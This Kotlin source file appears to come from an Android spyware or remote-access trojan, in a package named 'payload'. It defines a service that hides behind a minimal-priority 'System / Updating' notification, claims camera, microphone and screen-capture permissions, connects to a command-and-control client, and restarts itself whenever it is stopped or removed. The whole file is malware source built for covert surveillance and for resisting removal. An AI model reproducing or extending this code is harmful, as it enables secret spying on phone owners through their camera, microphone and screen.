package com.ihk909.payload

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import androidx.annotation.Nullable

class PersistentService : Service() {
    private var client: C2Client? = null

    override fun onCreate() {
        super.onCreate()
        val channelId = "sys"
        if (Build.VERSION.SDK_INT >= 26) {
            val ch = NotificationChannel(channelId, "System", NotificationManager.IMPORTANCE_MIN)
            ch.setShowBadge(false)
            getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
        }
        val notification: Notification = Notification.Builder(this, channelId)
            .setContentTitle("System")
            .setContentText("Updating")
            .setSmallIcon(android.R.drawable.ic_menu_manage)
            .setOngoing(true)
            .setPriority(Notification.PRIORITY_MIN)
            .build()

        if (Build.VERSION.SDK_INT >= 34) {
            startForeground(
                1, notification,
                ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or
                ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA or
                ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE or
                ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
            )
        } else {
            startForeground(1, notification)
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (client == null) {
            client = C2Client(this).also { it.connect() }
        }
        return START_STICKY
    }

    @Nullable
    override fun onBind(intent: Intent?): IBinder? = null

    override fun onTaskRemoved(rootIntent: Intent?) {
        startService(Intent(this, PersistentService::class.java))
        super.onTaskRemoved(rootIntent)
    }

    override fun onDestroy() {
        client?.disconnect()
        super.onDestroy()
        startService(Intent(this, PersistentService::class.java))
    }
}